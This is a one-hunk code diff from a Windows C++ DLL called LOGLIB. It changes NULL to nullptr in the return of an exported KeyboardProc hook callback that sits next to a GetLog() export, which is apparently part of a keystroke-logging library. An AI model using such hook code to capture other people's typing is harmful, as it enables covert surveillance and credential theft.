@@ -348,7 +348,7 @@ extern "C" LOGLIB_API LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LP
 			PrintSpecialKeys(key->vkCode, shiftDown);
 		}
 	}*/
-	return CallNextHookEx(NULL, nCode, wParam, lParam);
+	return CallNextHookEx(nullptr, nCode, wParam, lParam);
 }
 
 extern "C++" __declspec(dllexport) inline std::string GetLog() {
